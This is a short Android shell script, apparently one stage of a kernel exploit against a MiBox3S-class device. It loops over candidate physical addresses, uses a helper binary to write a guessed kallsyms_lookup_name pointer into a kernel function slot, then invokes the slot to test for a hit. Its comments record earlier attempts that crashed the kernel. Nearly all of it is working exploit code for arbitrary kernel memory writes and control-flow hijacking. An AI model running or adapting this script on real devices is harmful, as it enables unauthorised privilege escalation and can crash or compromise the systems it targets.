#!/system/bin/sh
# SPDX-License-Identifier: MIT
# Retry SLOT_PHYS scan with a VALID kernel-function canary.
# Previous attempts used 0xffffffc007300000 (physmap alias) or RET machine code
# -> wrong, caused oops when the slot was actually hit.
#
# KLN guess: our _text = 0xffffffc001080000, identical to MiBox3S 817 reference,
# where kallsyms_lookup_name = 0xffffffc00111e5d0.
D=/data/local/tmp
GW=$D/gaw64
KF=$D/kfunc_new
CAN=ffffffc00111e5d0

# candidates not yet tried with a correct canary
for P in 20df7a0 20c27a0 20b27a0 20e27a0 20827a0 20727a0 21127a0 21227a0; do
  echo "=== try SLOT_PHYS=0x$P canary=0x$CAN"
  $GW $P $CAN >/dev/null 2>&1 || { echo "  write fail"; continue; }
  R=$($KF call 244 2>&1 | tail -1)
  echo "  $R"
  case "$R" in
    *ffffffffffffffff*) ;;                 # -1 = slot untouched, continue
    *) echo ">>> HIT at 0x$P : $R"; exit 0;;
  esac
done
echo "no hit"
exit 2
